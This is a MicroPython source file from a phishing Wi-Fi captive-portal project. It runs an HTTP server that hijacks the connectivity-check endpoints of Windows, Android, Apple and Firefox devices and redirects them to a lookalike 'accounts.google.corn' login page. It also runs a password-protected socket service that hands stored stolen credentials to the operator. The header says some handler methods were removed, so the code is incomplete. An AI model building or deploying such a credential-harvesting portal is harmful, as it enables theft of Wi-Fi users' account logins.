# ﺏ
# Copyright [2022] Şefik Efe Altınoluk
#
# This file is a part of project Wi-Phi©
# For more details, see https://github.com/f4T1H21/Wi-Phi
#
# Licensed under the GNU GENERAL PUBLIC LICENSE Version 3.0 (the "License")
# You may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.gnu.org/licenses/gpl-3.0.html
#
# ATTENTION:
# All additional methods of the class 'HTTPServer' is removed as an ethical precaution.
# Without these methods, the software won't work properly.

import os
import gc
import sys
import time
import utils
import socket
import _thread


class HTTPServer:
    def __init__(self, client:object, address:tuple[str, int]):
        self.ip = address[0]
        self.index_file = "templates/index.html"
        self.error_file = "templates/error.html"
        hacky_file = "static/html/hacklendin.html"
        req = client.recv(1024).decode(encoding)
        t = time.localtime()

        # Check if this is a proper HTTP request
        if '\r\n\r\n' in req:
            # If the user is IP banned, only serve 'hacklendin.html' page.
            if address[0] in tea_lovers:
                response = b''.join(self.create_response(file=hacky_file, code=(code:=408)))

            else:
                method, self.file = self.parse(req)
                if method == 'GET':
                    response, code = self.handle_get()
                elif method == 'POST':
                    response, code = self.handle_post(req)
                else:
                    response, code = self.handle_get(method=False)

            try:
                client.send(response)
                # HTTP request-response logs.
                print(f'[HTTP] {address[0]} -> {code} <- [Uptime {t[3]}:{t[4]}:{t[5]}] "{req.splitlines()[0]}"')
            except OSError as e:
                # Handle 'ECONNRESET', 'ECONNABORTED' and 'ETIMEDOUT' errors respectively.
                if e.errno == 104 or e.errno == 113 or e.errno == 116:
                    pass
                else:
                    raise
            except Exception as e:
                print(f'[!] Individual thread Error:\n{e}')
                client.close()
                sys.exit(1)

        client.close()
        gc.collect()


class TCPServer:
    def __init__(self, address:tuple[str, int], comm_port:int=2121):
        global encoding, delimiter, tea_lovers, fileset, ignored_nameset, captive_endpoints, dbfile
        encoding = 'utf-8'
        delimiter = ';deLIMITer;'
        tea_lovers = set()
        
        # As os.walk doesn't exist in micropython, I had to write my own.
        fileset = {root + '/' + file for root, dirs, files in utils.walk('static') for file in files if file != 'hacklendin.html'}
        fileset.update({'templates/index.html'})

        # Dummy names' set for further control
        ignored_nameset = {'google', 'chrome', 'microsoft', 'windows', 'samsung', 'hacker'}

        captive_endpoints = {
            # For Microsoft's (Windows) devices
            'ncsi.txt':             'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nMicrosoft NCSI\r\n\r\n',
            'connecttest.txt':      'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nMicrosoft Connect Test\r\n\r\n',
            'redirect':             'HTTP/1.1 302 Found\r\nLocation: http://accounts.google.corn\r\n\r\n',
            # For Google's (Android) devices
            'generate_204':         'HTTP/1.1 302 Found\r\nLocation: http://accounts.google.corn\r\n\r\n',
            'gen_204':              'HTTP/1.1 302 Found\r\nLocation: http://accounts.google.corn\r\n\r\n',
            # For Apple's (IOS/MacOS) devices
            'hotspot-detect.html':  'HTTP/1.1 302 Found\r\nLocation: http://accounts.google.corn\r\n\r\n',
            # For Firefox (Mozilla)
            'canonical.html':       'HTTP/1.1 302 Found\r\nLocation: http://accounts.google.corn\r\n\r\n',
            'success.txt':          'HTTP/1.1 302 Found\r\nLocation: http://accounts.google.corn\r\n\r\n'
        }

        # As os.path.esixts doesn't exist in micropython, I had to write my own.
        if not (dbfile:='db.txt') in os.listdir():
            open(dbfile, 'x')

        self.address = address
        self.host = address[0]
        self.port = address[1]

        _thread.start_new_thread(self.communicate, (comm_port,))
        self.start_http_server()

    def start_http_server(self):
        http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        http_sock.bind(self.address)
        http_sock.listen(1)
        print(f'[HTTP] Server listening on {self.host}:{self.port}/tcp')

        while True:
            try:
                client, address = http_sock.accept()
                # Respond requests in their individual threads
                _thread.start_new_thread(HTTPServer, (client, address,))
                gc.collect()
                time.sleep(.1)
            except OSError as e:
                # Handle "can't create thread" error.
                if e.errno == "can't create thread" or e.errno == 23:
                    continue
                else:
                    raise
            except Exception as e:
                print(f'[!] http_sock Error:\n{e}')
                print('\nClosing http_sock...')
                http_sock.close()
                sys.exit(1)

    # Also need to see the credentials remotely, right?
    def communicate(self, comm_port:int):
        comm_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        comm_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        comm_sock.bind((self.host, comm_port))
        comm_sock.listen(1)
        # CS stands for Credential Store ;)
        print(f'[CS] Server listening on {self.host}:{comm_port}/tcp\n')

        while True:
            try:
                client, address = comm_sock.accept()
                client.send('Enter the password: '.encode(encoding))
                password = client.recv(1024).decode(encoding)
                # An advanced authentication system that uses my name as the password.
                if password == 'Şefik_Efe\n':
                    with open(dbfile, 'r') as db:
                        lines = [':::'.join(i.split(delimiter)) for i in db.readlines()]
                    if lines:
                        client.send(''.join(lines).encode(encoding))
                    else:
                        client.send('─ Empty ─'.encode(encoding))
                else:
                    client.send('You sucked!'.encode(encoding))
                client.close()
                gc.collect()
            except OSError as e:
                    # Handle 'ECONNRESET', 'ECONNABORTED' and 'ETIMEDOUT' errors respectively.
                    if e.errno == 104 or e.errno == 113 or e.errno == 116:
                        client.close()
                        gc.collect()                        
                        continue
                    else:
                        raise
            except Exception as e:
                print(f'[!] comm_sock Error:\n{e}')
                print('\nClosing comm_sock...')
                comm_sock.close()
                sys.exit(1)
